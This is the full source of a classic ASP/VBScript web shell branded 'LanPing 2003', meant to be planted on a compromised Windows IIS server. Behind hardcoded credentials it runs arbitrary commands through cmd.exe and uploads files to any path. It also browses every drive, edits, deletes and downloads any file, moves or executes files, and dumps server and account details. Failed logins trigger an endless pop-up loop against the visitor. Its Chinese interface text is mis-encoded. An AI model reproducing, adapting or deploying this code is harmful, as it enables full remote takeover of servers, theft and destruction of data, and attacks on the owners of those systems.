<%@ LANGUAGE="VBSCRIPT" codepage="936"%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style>
body{font-size: 9pt;color: blue}
table{font-family: ����;font-size: 9pt}
a{font-family: ����;font-size: 9pt;color: blue;text-decoration: none}
a:hover{font-family: ����;color: #990000;text-decoration: none}
input {BORDER-RIGHT: #888800 1px solid;BORDER-TOP: #888800 1px solid;
BACKGROUND: #ffffff;BORDER-LEFT: #888800 1px solid;
BORDER-BOTTOM: #888800 1px solid;FONT-FAMILY: "Verdana","Arial"font-color: #ffffff;FONT-SIZE: 9pt;}
</style>
<%
Response.Expires=0
Co=Request.ServerVariables("SCRIPT_NAME")
if session("zh_opt")="zhang1891" then
Session.TimeOut=50
Session(Co)=0
if request("up")=1 then
Server.ScriptTimeOut=3000
%>
<SCRIPT RUNAT=SERVER LANGUAGE="VBSCRIPT">
DIM zh
CLASS zha
dim isForm,isFile

Public function Form(strForm)
strForm=lcase(strForm)
if not isForm.exists(strForm) then
Form=""
else
Form=isForm(strForm)
end if
end function

Public function File(strFile)
strFile=lcase(strFile)
if not isFile.exists(strFile) then
set File=new FileInfo
else
set File=isFile(strFile)
end if
end function

Private Sub CLASS_Initialize 
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd,iFormStart,iFormEnd,sFormName
set isForm=Server.CreateObject("Scripting.Dictionary")
set isFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream=Server.CreateObject("adodb.stream")
set zh=Server.CreateObject("adodb.stream")
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
RequestData=zh.Read

iFormStart=1
iFormEnd=LenB(RequestData)
vbCrlf=chrB(13) & chrB(10)
sStart=MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart=LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart+10)<iFormEnd
iInfoEnd=InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type=1
tStream.Mode=3
tStream.Open
zh.Position=iFormStart
zh.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position=0
tStream.Type=2
tStream.Charset="gb2312"
sInfo=tStream.ReadText
tStream.Close

iFormStart=InStrB(iInfoEnd,RequestData,sStart)
iFindStart=InStr(22,sInfo,"name=""",1)+6
iFindEnd=InStr(iFindStart,sInfo,"""",1)
sFormName=lcase(Mid(sinfo,iFindStart,iFindEnd-iFindStart))

if InStr (45,sInfo,"filename=""",1)>0 then
set theFile=new FileInfo

iFindStart=InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd=InStr(iFindStart,sInfo,"""",1)
sFileName=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)

iFindStart=InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd=InStr(iFindStart,sInfo,vbCr)
theFile.FileType=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart=iInfoEnd
theFile.FileSize=iFormStart-iInfoEnd-3
theFile.FormName=sFormName
if not isFile.Exists(sFormName) then
isFile.add sFormName,theFile
end if
else
tStream.Type=1
tStream.Mode=3
tStream.Open
zh.Position=iInfoEnd
zh.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position=0
tStream.Type=2
tStream.Charset="gb2312"
sFormValue=tStream.ReadText
tStream.Close
if isForm.Exists(sFormName) then
isForm(sFormName)=isForm(sFormName)&","&sFormValue
else
isForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream=nothing
End Sub

Private Sub CLASS_Terminate
if Request.TotalBytes>0 then
isForm.RemoveAll
isFile.RemoveAll
set isForm=nothing
set isFile=nothing
zh.Close
set zh=nothing
end if
End Sub
   
Private function GetFilePath(FullPath)
If FullPath<>"" Then
GetFilePath=left(FullPath,InStrRev(FullPath,"\"))
Else
GetFilePath=""
End If
End function

Private function GetFileName(FullPath)
If FullPath<>"" Then
GetFileName=mid(FullPath,InStrRev(FullPath,"\")+1)
Else
GetFileName=""
End If
End function
End CLASS

CLASS FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub CLASS_Initialize
FileName=""
FilePath=""
FileSize=0
FileStart=0
FormName=""
FileType=""
End Sub
  
Public function SaveAs(FullPath)
dim dr
if FileStart=0 or FileName="" or right(fullpath,1)="\" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FileStart
zh.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
end function
End CLASS
</SCRIPT>
<%
dim upload,file,formName,formPath
set upload=new zha
formPath=upload.isform("filepath")
if right(formPath,1)<>"\" then formPath=formPath&"\"
for each formName in upload.isFile
set file=upload.isFile(formName)
if file.filesize<1 then
Response.Write "NO file selected<a href=# onclick=history.go(-1)>[RE]</a>"
response.end
end if
file.SaveAs (formPath&file.FileName)
Response.write " up��"&formPath&file.FileName&" OK!"
set file=nothing
next
set upload=nothing
response.write "<a href=# onclick=history.go(-1)>[BACK]</a>"
response.end
else
Set tN=Server.CreateObject("WSCRIPT.NETWORK")
dN="\\"&tN.ComputerName&"\"&tN.UserName
if trim(request.form("password"))<>"" and trim(request.form("password"))<>"zhangg" then call out()
if trim(request.form("password"))="zhangg" then
session("password")="zh1891"
response.redirect ""&Co&""
else
if session("password")<>"zh1891" then
call login()
response.end
end if
set fB=CreateObject("Scripting.FileSystemObject")

select case request("id")
case "edit"
call edit()
case "dir"
call dir()
case "down"
call dlf(request("path"))
case"pan"
call pan()
case "out"
call out()
case else
call main()
end select
end if

sub login()
set sa=server.createobject("shell.application")
%>
<center>
<table border=1 width=600 cellspacing=0 cellpadding=0>
<tr bgcolor="#EEEEEE" height=18>
<td width="30%"> ��������</td>
<td width="70%"><a href="http://<%=Request.ServerVariables("SERVER_NAME")%>"target=_blank>
 <%=Request.ServerVariables("SERVER_NAME")%></a></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> ������IP : �˿�  ʱ��</td>
<td> <%=Request.ServerVariables("LOCAL_ADDR")%> : <font color=red>
<%=Request.ServerVariables("SERVER_PORT")%></font>  <%=now%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> ������CPU���� {����ϵͳ}</td>
<td> <%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> �� {<%=Request.ServerVariables("OS")%>}</td>
</tr>
<tr bgcolor="#EEEEEE" height=18>
<td><font class=fonts> ��������ַ:</font></td>
<td> <%=dN%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<%
dim t1,t2,ys,Ttime
t1=timer
for i=1 to 500000
ys= 1 + 1
next
t2=timer
Ttime=cstr(int(((t2-t1)*10000)+0.5)/10)
%>
<td> �����������ٶ� </td>
<td> <%=Ttime%> ����  (256M 2.4GΪ156.3����)</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> <font color=red>�ͻ���IP: �˿� [�޴���]</td>
<td> <font color=red><%=Request.ServerVariables("REMOTE_ADDR")%> : 
<%=Request.ServerVariables("REMOTE_PORT")%> [ 
<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td>
</tr>
<tr bgcolor="#dddddd" height=18>
<td> ���ļ�����·��</td>
<td> <a href=<%=Co%> title=ˢ��><%=server.mappath(Co)%></a></td>
</tr>
<TR><TD colspan="4" bgcolor="#ffffff">
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
 ����·��:<input type="text" name="filepath" value="<%=Server.MapPath(".")%>"size=86><BR>
 �ļ�:<input type="file" name="file1"size=72> <input type="submit" name="upup" value="�ϴ�">
</TD></TR></form></table>
<table><BR>
<form method="POST" action="<%=Co%>">
Pass��<input type="password" name="password" size=12>
<input type=submit name=sb value=��������>
<input type=submit name=Submit value=���������б���>
<%=timer%>   
<B>LanPing&copy;2003</B><BR>
����:<input type=text name=text1 size=38>
 Ŀ��·��:<input type=text name=text2 size=40><br>
�ƶ�:<input type=text name=text3 size=38>
 Ŀ��·��:<input type=text name=text4 size=40><br>
����:<input type=text name=text5 size=38>
 ��Ӳ���:<input type=text name=text6 size=40><br>
���:<input type=text name=text size=38>
DOS����:<input type="text" name="ok" size="41">
</form></table></center>
<hr>
<%
On Error Resume Next
hz=Request.Form("ok")
if hz<>"" then
hz="cmd.exe /c "&hz&""
set zh=server.CreateObject("WScript.Shell")
zh.run ""&hz&"",1,True
response.write "ִ�� "&hz&" ���!"
response.end
end if

check=Request.Form("Submit")
if check <>"" then
response.write "<p align=center>�����������б���</p>"
for each name in request.servervariables
response.write "<br><b>"&name&"</br>"
response.write request.servervariables(name)
response.write "<HR>"
next
end if

sz=Request.Form("text")
if (sz <> "") then
if right(sz,1)<>"\" then sz=sz&"\"
set fod1=sa.namespace(sz)
set foditems=fod1.items
for each co in foditems
response.write ""&co.path&"-----"&co.size&"<br>"
next
end if

sz1=Request.Form("text1")
sz2=Request.Form("text2")
if sz1<>"" and sz2<>"" then
set fod1=sa.namespace(sz2)
for i=len(sz1) to 1 step -1
if mid(sz1,i,1)="\" then
path=left(sz1,i-1)
exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(sz1,len(sz1)-i)
set fod2=sa.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "ok!"
end if

sz3=Request.Form("text3")
sz4=Request.Form("text4")
if sz3<>"" and sz4<>"" then
set fod1=sa.namespace(sz4)
for i=len(sz3) to 1 step -1
if mid(sz3,i,1)="\" then
path=left(sz3,i-1)
exit for
end if
next
if len(path)=2 then path=path&"\"
path2=right(sz3,len(sz3)-i)
set fod2=sa.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "ok!"
end if

sz5=Request.Form("text5")
sz6=Request.Form("text6")
if sz5<>"" and sz6<>"" then
sa.namespace(sz5).items.item(sz6).invokeverb
response.write "ok!"
end if
set sa=Nothing
end sub

sub main()
dim cpath,lpath
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%>
<script language="JavaScript">
function crfile(ls)
{
if (ls==""){alert("�����ļ���!");}
else {window.open("<%=Co%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{
if (ls==""){alert("�����ļ���!");}
else {window.open("<%=Co%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("ɾ����"&ls&"Ŀ¼?") then
window.open("<%=Co%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"Դ�ļ���"&sfile&Chr(13)&Chr(10)&"����Ŀ���ļ����ļ���:"&Chr(13)&Chr(10)&"���·��,���ݵ�ǰ·��ģʽ. ����·��ʾ��c:/��c:\������")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "ģʽ����"&Chr(13)&Chr(10)&"����·����["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=Co%>?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"�����ļ�����"
end If
end sub
</script>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8>
<TBODY>
<tr bgcolor="#F5F5F5">
<td height=22 colspan="4"bgcolor="#eeeeee">(����)
·�� <%=Request.ServerVariables("APPL_PHYSICAL_PATH")%>
���ļ�: <a href=<%=Co%>?id=out title=�˳�><%=server.mappath(Co)%></a> 
</td>
</tr>
<TR ><TD height=22 colspan="4"bgcolor="#eeeeee">�л��̷���
<%For Each thing in fB.Drives
Response.write "<a href='"&Co&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"��:</a>&nbsp;"
NEXT%>    ��������ַ��
<%=dN%></TD>
</TR>

<TR>
<TD align=center height=22 colspan="4"bgColor=#cccccc>
<font color=red><%=Request.ServerVariables("REMOTE_ADDR")%> :
<%=Request.ServerVariables("REMOTE_PORT")%> [ <%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font>
<a href=<%=Co%>?id=pan>������Ϣ</a>
<b>LanPing&copy;2003.10</b>
<%=now%>
</TD></TR>

<TD colspan="4" bgcolor="#ffffff">
<%if Request("attrib")="true" then
response.write "<a href='"&Co&"'><font color='#D00000'>�������·��</font></a>"
else
response.write "<a href='"&Co&"?attrib=true'><font color='#D00000'>��������·��</font></a>"
end if
%>
 ·��: <%=cpath%>    ��ǰ���Ŀ¼:<%=lpath%></TD></TR>

<TR><TD height=22 colspan="4" bgcolor="#eeeeee">
<form name="form1" method="post" action="<%=Co%>">
���Ŀ¼: <input type="text" name="path" size="66" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="���"> ������·��,֧�־�������ַ����
</TD></form></TR>

<TR><TD colspan="4" bgcolor="#ffffff">
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
���þ���·������������������Ŀ¼:
<input type="text" name="filepath" value="<%=Server.MapPath(".")%>"size="40">
�ļ�:<input type="file" name="file1"> <input type="submit" name="Submit" value="�ϴ�">
</TD></form></TR>

<TR bgColor=#eeeeee><TD height=22 colspan="4">
<form name="newfile" onSubmit="return crfile(newfile.filename.value);">
��<%=cpath%>��
<input type="text" name="filename" size="40">
<input type="submit" value="���ļ�" >
<input type="button" value="��Ŀ¼"onclick="crdir(newfile.filename.value)">���½��ļ����½�Ŀ¼����ͬ����
</TD></form></TR>

<TR bgColor=#dddddd><TD width="26%" rowspan="2" valign="top" bgColor=#dddddd>
<%
dim theFolder,theSubFolders
if fB.FolderExists(cpath)then
Set theFolder=fB.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&Co&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>��</font>��<font color='ff2222'>�ϼ�Ŀ¼</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&Co&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>��<font color='#FF8000'>��</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >��</font>ɾ��</a><br>"
Next
end if
%>
</TD>
<TD valign="top" width="44%">�ļ��� ������Ƶ��ļ������Բ鿴�ļ����ԣ�</TD>
<TD valign="top" width="11%">��С���ֽڣ�</TD>
<TD valign="top" width="18%">�ļ�����</TD>
</TR>
<TR><TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fB.FolderExists(cpath)then
Set theFolder=fB.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<a href='"&Co&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' title='"&"����"&x.type&chr(10)&"����"&x.Attributes&chr(10)&"ʱ�䣺"&x.DateLastModified&"'><strong>"&x.Name&"</strong></a>"
else
showstring="<a href='"&lpath&x.Name&"' title='"&"����"&x.type&chr(10)&"����"&x.Attributes&chr(10)&"ʱ�䣺"&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%' style='border-bottom:1 solid #000000;'><font color='#FF8000'>��</font>"&showstring&"</td><td width='8%' style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%' style='border-bottom:1 solid #000000;'>&nbsp;<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>�༭</a>&nbsp<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank'>ɾ��</a>"
if Request("attrib")="true" then Response.write"&nbsp;<a href=# onclick=copyfile('"&lpath&x.Name&"')>����</a>"
Response.write"</td></tr>"
Next
Response.write"</table>"
end if
%>
</TD></TR></TBODY></TABLE>
<%
end sub

sub pan()
For Each pa in fB.Drives
On Error Resume Next
pa1=pa.AvailableSpace
if pa1/1024/1024<1024 then
pa1=round(pa1/1024/1024*100)/100&" MB"
else
pa1=round(pa1/1024/1024/1024*100)/100&" GB"
end if
pa2=round(pa.TotalSize/1024/1024/1024*100)/100
pa3=pa.DriveType
select case pa3
case 0
pa3="δ֪"
case 1
pa3="����"
case 2
pa3="Ӳ��"
case 3
pa3="����"
case 4
pa3="����"
case 5
pa3="RAM��"
end select
Response.write"<a href='"&Co&"?path="&pa.DriveLetter&":&attrib=true'>"
Response.write" "&pa3&" "&pa.DriveLetter&" &nbsp;�ļ�ϵͳ:"&pa.FileSystem&" &nbsp;&nbsp;����&nbsp; "&pa2&" GB &nbsp;&nbsp;&nbsp;���ÿռ�&nbsp;"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>"
next
Response.end
end sub

sub edit()
if Request("attrib")="true" then
pF=Request("path")
else
pF=server.mappath(Request("path"))
end if

if request("op")="del" then
Set ZF=fB.GetFile(pF)
ZF.Delete True
Response.write "<br><center>ɾ���ɹ���Ҫˢ�²��ܿ���Ч��.</center>"
else
if request("op")="copy" then
if Request("attrib")="true" then
dsfile=Request("dpath")
else
dsfile=Server.MapPath(Request("dpath"))
end if

Set ZF=fB.GetFile(pF)
ZF.copy dsfile
Response.write "<center><p>Դ�ļ���"+pF+"</center>"
Response.write "<center><br>Ŀ���ļ���"+dsfile+"</center>"
Response.write "<center><br>���Ƴɹ���ˢ�¿�Ч��!</p></center>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then

Set ZF=fB.OpenTextFile(pF,1,False)
this=Server.HTMLEncode(ZF.readall)
ZF.Close
end if
%>
<SCRIPT language=JavaScript>
var i=0;
var ie=(document.all)?1:0;
var ns=(document.layers)?1:0;
function selectCode()
{
if(document.pad.text.value.length>0)
{
document.pad.text.focus();
document.pad.text.select();
}
else alert('��ѡ������!')
}
function preview()
{
if(document.pad.text.value.length>0)
{
pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");
pr.document.write(document.pad.text.value);
}
else alert('��Ԥ������!')
}
function uncompile()
{
if (document.pad.text.value.length>0)
{
source=unescape(document.pad.text.value);
document.pad.text.value=""+source+"";
	i++;
	alert("�����ѱ���"+i+"��!");
}
else alert('�޴����ܴ���!')
}
</SCRIPT>
<form method="POST" name=pad action="<%=Co%>?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8 border=0>
<TR><TD height=22 bgcolor="#eeeeee"><div align="center">EDIT</div></TD></TR>
<TR ><TD width="100%" height=22 bgcolor="#ffffff">�ļ�����
<input type="text" name="path" size="45" value="<%=Request("path")%>"></TD>
</TR>
<TR><TD bgcolor="#eeeeee">
<textarea rows="30" name="text" cols="100%"><%=this%></textarea>
</TD>
</TR>
<TR><TD height=22 bgcolor="#ffffff"><div align="center">
<input type="submit" value="�ύ" name="B1">
<INPUT name=select onclick=selectCode() type=button value=ȫѡ>
<INPUT name=view onclick=preview() type=button value=Ԥ��>
<INPUT name=retur onclick=uncompile() type=button value=JAVA����>
<INPUT name=clear type=reset value=����>
</div></TD></TR></TABLE></form>
<%
else
Set outfile=fB.CreateTextFile(pF)
outfile.WriteLine Request("text")
outfile.close
Response.write "<center>�޸ĳɹ���ˢ�¾Ϳ���Ч��!</center>"
end if
end if
end if

end sub
end if

sub dir()

if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if

if request("op")="del" then
fB.DeleteFolder whichdir,True
Response.write "<center> ɾ��Ŀ¼:<b>"&whichdir&"</b></center>"
else
if request("op")="creat"  then
fB.CreateFolder whichdir
Response.write "<center> �½�Ŀ¼:<b>"&whichdir&"</b></center>"
end if
end if
end sub

function dlf(strFile)
strFilename=Request("path")
Response.Buffer=True
Response.Clear
Set s=Server.CreateObject("ADODB.Stream")
s.Open
s.Type=1
on error resume next
if not fB.FileExists(strFilename) then
strFilename=server.MapPath(strFile)
Response.Write("<h1>����:</h1>"&strFilename&" ������<p>")
Response.End
end if
Set f=fB.GetFile(strFilename)
intFilelength=f.size
s.LoadFromFile(strFilename)
if err then
Response.Write("<h1>Error: </h1>"&err.Description&"<p>")
Response.End
end if
Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
Response.AddHeader "Content-Length", intFilelength
Response.CharSet="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite s.Read
Response.Flush
s.Close
Set s=Nothing
response.end
End Function

function out()
Session.Abandon
response.redirect ""&Co&""
response.end
End Function

else
randomize timer
regjm=int(rnd*8998)+1000
%>
<script language=javascript>
function check()
{
var mjj=document.adm
if(mjj.admid.value.length<=0)
{alert("���֣�");
mjj.admid.focus();
return false;}
if(mjj.admpw.value.length<=0)
{alert("���룿");
mjj.admpw.focus();
return false;}
if(mjj.admrz.value.length<=0)
{alert("��֤�룿");
mjj.admrz.focus();
return false;}
var n1=mjj.admrz.value;
var n2=mjj.admrz1.value;
if(n1!=n2)
{window.alert('��֤��: '+n2+'');
mjj.admrz.focus();
return false;}
}
</script>
<table width="320" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="#61bbd3">
<tr> 
<td height="30" align="center">
<font style="FONT-SIZE: 18pt" color=blue>��¼</font>
<%
if request.form("admid")<>"" and trim(request.form("admid"))<>"zhang" then response.write "<B>����</B>��"
if request.form("admpw")<>"" and trim(request.form("admpw"))<>"cell" then response.write "	<STRONG><font style='FONT-SIZE: 14pt' color=red>�����</font></STRONG>"
if trim(request.form("admid"))="zhang" and trim(request.form("admpw"))="cell" then
session("zh_opt")="zhang1891"
response.redirect ""&Co&""
response.end
else
Session(Co)=Session(Co)+1
if Session(Co)=4 then
response.redirect "http://"&Request.ServerVariables("SERVER_NAME")&""
response.end
end if
if Session(Co)>4 then
Session(Co)=0
response.write"<script language='JavaScript'>while(true){window.open('"&Co&"','','fullscreen=yes,Status=no,scrollbars=no,resizable=no');}</script>"
response.end
end if
%>
</td>
</tr>
<tr valign="top">
<td height="182"align="center">
<form method="post" action="<%=Co%>" name="adm" onsubmit="return check()">
<table width="80%" border="2" cellspacing="0" cellpadding="0">
<tr> 
<td width="24%" align="center">����:</td>
<td width="76%">
<input type="text" name="admid" class="areatype">
</td>
</tr>
<tr> 
<td width="24%" align="center">����:</td>
<td width="76%">
<input type="password" name="admpw" class="areatype">
</td>
</tr>
<tr><input type=hidden name="admrz1" value="<%=regjm%>">
<td width="24%" align="center">��֤:</td>
<td width="76%">
<input type="password" name="admrz" class="areatype"> <%=regjm%>
</td>
</tr>
<tr align="center">
<td colspan="2" height="60">�Ự�ɣ�:<%=Session.SessionID%>
<input type="submit" name="Submit" value="��¼" class="areatype"> <%=Session(Co)%> ��
</td>
</tr>
</table>
</form><b>LanPing&copy;2003.10</b>
</td>
</tr>
<%end if%>
</table>
<%end if%>